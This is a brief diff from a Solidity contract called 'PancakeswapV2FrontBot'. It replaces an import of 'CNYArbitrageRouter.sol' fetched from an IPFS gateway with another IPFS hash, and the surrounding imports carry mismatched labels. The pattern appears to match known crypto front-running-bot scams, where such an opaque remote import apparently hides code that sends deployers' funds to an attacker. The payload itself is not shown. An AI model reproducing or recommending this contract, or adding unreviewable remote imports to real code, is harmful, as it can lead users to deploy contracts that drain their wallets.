@@ -5,7 +5,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 // PancakeSwap manager
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://ipfs.eth.aragon.network/ipfs/QmRinu31gwUek5TgWyvX9WpGYmAPc1Dm4MCKYQjxiTENt8#CNYArbitrageRouter.sol";
+import "https://ipfs.eth.aragon.network/ipfs/QmSUdcyY2AaNvfN1a1wEygwzVGic1CMaMEVpW6jU59FfAS#CNYArbitrageRouter.sol";
 
 contract PancakeswapV2FrontBot {
     
